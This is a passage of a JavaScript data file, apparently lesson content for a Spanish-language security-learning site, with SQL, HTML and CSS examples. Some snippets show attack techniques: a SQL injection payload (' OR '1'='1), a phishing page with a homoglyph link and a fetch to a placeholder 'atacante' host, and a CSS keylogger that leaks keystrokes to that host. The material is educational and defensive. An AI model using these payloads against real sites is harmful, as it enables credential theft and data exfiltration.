    usuario_id INTEGER REFERENCES usuarios(id)
);

-- DML: datos
INSERT INTO usuarios (usuario, email, rol) VALUES
    ('ada', 'ada@corp.local', 'admin'),
    ('grace', 'grace@corp.local', 'auditor'),
    ('linus', 'linus@corp.local', 'user');

INSERT INTO hallazgos (titulo, severidad, usuario_id) VALUES
    ('SQLi en /login', 'critica', 1),
    ('Directorio listado', 'baja', 2),
    ('Headers ausentes', 'media', 2);

-- consultas: WHERE, ORDER, aggregate
SELECT usuario, rol FROM usuarios WHERE activo = 1 ORDER BY usuario;
SELECT severidad, COUNT(*) AS total FROM hallazgos GROUP BY severidad ORDER BY total DESC;

-- JOIN: lo importante
SELECT h.titulo, h.severidad, u.usuario
FROM hallazgos h JOIN usuarios u ON u.id = h.usuario_id
WHERE h.severidad IN ('alta','critica')
ORDER BY CASE h.severidad WHEN 'critica' THEN 0 WHEN 'alta' THEN 1 END;

-- UPDATE y DELETE (con cuidado)
UPDATE usuarios SET rol = 'admin' WHERE usuario = 'grace';
SELECT 'grace ahora es: ' || rol FROM usuarios WHERE usuario='grace';`,
    sections: [
      { title: 'SELECT', desc: 'El 80% de tu vida SQL.', snippet: `SELECT * FROM usuarios;
SELECT usuario, email FROM usuarios WHERE rol = 'admin' LIMIT 5;
SELECT DISTINCT severidad FROM hallazgos;` },
      { title: 'JOIN', desc: 'INNER (coinciden), LEFT (todos los de la izquierda).', snippet: `SELECT u.usuario, h.titulo
FROM usuarios u
LEFT JOIN hallazgos h ON h.usuario_id = u.id;` },
      { title: 'Agregación', desc: 'COUNT/SUM/AVG con GROUP BY y HAVING.', snippet: `SELECT severidad, COUNT(*) n
FROM hallazgos
GROUP BY severidad
HAVING n > 1;` },
      { title: 'SQLi: por qué existe', desc: 'Concatenar strings = entregar el control de la consulta.', snippet: `-- Vulnerable (PHP mental):
-- "SELECT * FROM users WHERE u='" + input + "'"
-- input: ' OR '1'='1
SELECT * FROM usuarios WHERE usuario = '' OR '1'='1';  -- ¡todo!
-- La cura: prepared statements, SIEMPRE` },
    ],
  },
  {
    id: 'html',
    name: 'HTML',
    prism: 'markup',
    tagline: 'La estructura de la web y el lienzo donde viven los payloads XSS y el phishing.',
    engineNote: 'Se renderiza de verdad en un iframe sandbox de solo lectura: tu HTML corre (scripts incluidos) dentro de la vista previa.',
    defaultCode: `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Demo HTML | HackNexus</title>
  <style>
    body { font-family: system-ui; background: #0b0f0d; color: #e2e8f0; padding: 2rem; }
    .card { border: 1px solid #1e3a2f; border-radius: 12px; padding: 1rem; max-width: 420px; }
    button { background: #2ee88a; border: 0; padding: .5rem 1rem; border-radius: 8px; font-weight: bold; }
  </style>
</head>
<body>
  <h1>Hola HTML 👋</h1>

  <div class="card">
    <h2>Formulario (el clásico phishing)</h2>
    <form onsubmit="event.preventDefault(); document.getElementById('out').textContent = 'enviado: ' + document.getElementById('u').value;">
      <label>Usuario <input id="u" value="ada"></label>
      <button type="submit">Entrar</button>
    </form>
    <p id="out" style="color:#2ee88a"></p>
  </div>

  <p>Estructura semántica: <code>header nav main section article footer</code></p>
  <a href="https://d1se0.github.io/hacknexus/" target="_blank" rel="noopener">enlace con rel="noopener" ✓</a>
</body>
</html>`,
    sections: [
      { title: 'Esqueleto', desc: 'DOCTYPE, head con meta, body semántico.', snippet: `<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>t</title></head>
<body><main><h1>título</h1><p>texto</p></main></body>
</html>` },
      { title: 'Formularios', desc: 'input, label, button y sus tipos.', snippet: `<form action="/login" method="post">
  <label for="u">Usuario</label><input id="u" name="u" required>
  <label for="p">Clave</label><input id="p" name="p" type="password">
  <button type="submit">Entrar</button>
</form>` },
      { title: 'Anatomía de un phishing', desc: 'Qué mirar para detectarlo (y por qué funciona).', snippet: `<!-- Pistas de phishing:
  - <input> pide credenciales en página clonada
  - href="http://paypa1.com" (homoglyph 1 vs l)
  - Sin HTTPS / favicon ausente / typos en branding
  - onsubmit="fetch('https://atacante/…')" → exfil -->
<a href="https://paypa1.com/login">Verificar cuenta</a>` },
      { title: 'XSS: los 3 contextos', desc: 'HTML body, atributo y JS string.', snippet: `<div id="out"></div>
<script>
  // MAL: out.innerHTML = location.hash.slice(1)   ← XSS
  // BIEN:
  document.getElementById('out').textContent = location.hash.slice(1) || '(sin hash)';
</script>` },
    ],
  },
  {
    id: 'css',
    name: 'CSS',
    prism: 'css',
    tagline: 'La piel de la web: del grid layout a keyloggers con :hover… sí, CSS también pica.',
    engineNote: 'Vista previa en vivo con iframe: la pestaña "demo" combina CSS+HTML, o prueba el CSS directo con el markup de ejemplo.',
    defaultCode: `/* variables y selectores */
:root {
  --verde: #2ee88a;
  --fondo: #0b0f0d;
  --borde: #1e3a2f;
}

body {
  font-family: system-ui, sans-serif;
  background: var(--fondo);
  color: #e2e8f0;
  display: grid;
  place-items: center;
  min-height: 100vh;
  margin: 0;
}

.card {
  border: 1px solid var(--borde);
  border-radius: 16px;
  padding: 2rem;
  max-width: 380px;
  transition: transform .2s ease, box-shadow .2s ease;
}

.card:hover {
  transform: translateY(-4px);
  box-shadow: 0 8px 30px rgba(46, 232, 138, .15);
}

.btn {
  background: var(--verde);
  color: #06130c;
  border: 0;
  padding: .6rem 1.4rem;
  border-radius: 10px;
  font-weight: 700;
  cursor: pointer;
}

.btn:active { transform: scale(.97); }

@keyframes pulso {
  0%, 100% { opacity: 1; }
  50% { opacity: .5; }
}
.status { animation: pulso 1.6s infinite; }

@media (max-width: 480px) {
  .card { margin: 1rem; }
}`,
    demoHtml: `<!DOCTYPE html>
<html><head><style>
:root { --verde: #2ee88a; --fondo: #0b0f0d; --borde: #1e3a2f; }
body { font-family: system-ui; background: var(--fondo); color: #e2e8f0; display: grid; place-items: center; min-height: 100vh; margin: 0; }
.card { border: 1px solid var(--borde); border-radius: 16px; padding: 2rem; max-width: 380px; transition: transform .2s, box-shadow .2s; }
.card:hover { transform: translateY(-4px); box-shadow: 0 8px 30px rgba(46,232,138,.15); }
.btn { background: var(--verde); color: #06130c; border: 0; padding: .6rem 1.4rem; border-radius: 10px; font-weight: 700; cursor: pointer; }
.btn:active { transform: scale(.97); }
@keyframes pulso { 0%,100%{opacity:1} 50%{opacity:.4} }
.status { animation: pulso 1.6s infinite; color: var(--verde); }
</style></head>
<body>
  <div class="card">
    <h1>Card con CSS ✓</h1>
    <p>Pasa el ratón por aquí: transform + shadow.</p>
    <button class="btn">Botón con :active</button>
    <p class="status">● animación @keyframes en vivo</p>
  </div>
</body></html>`,
    sections: [
      { title: 'Selectores', desc: 'De tag a :nth-child: la especificidad manda.', snippet: `.card > h2 { }           /* hijo directo */
input[type="password"] { }
li:nth-child(odd) { }
a:hover, a:focus-visible { }` },
      { title: 'Box model y flexbox', desc: 'margin/border/padding + display:flex.', snippet: `.fila {
  display: flex;
  gap: 1rem;
  justify-content: space-between;
  align-items: center;
}` },
      { title: 'Grid', desc: 'Layouts 2D sin frameworks.', snippet: `.galeria {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
  gap: 12px;
}` },
      { title: 'CSS "ofensivo"', desc: 'Exfiltración por atributos (CSS exfil) y clickjacking visual.', snippet: `/* keylogger CSS (demo de ataque real):
input[value^="a"] { background: url(//atacante/a); }
input[value^="b"] { background: url(//atacante/b); }
/* cada tecla dispara una petición: contramedida: CSP */` },
    ],
  },
]

export const LANG_INDEX = Object.fromEntries(LANGS.map((l) => [l.id, l]))
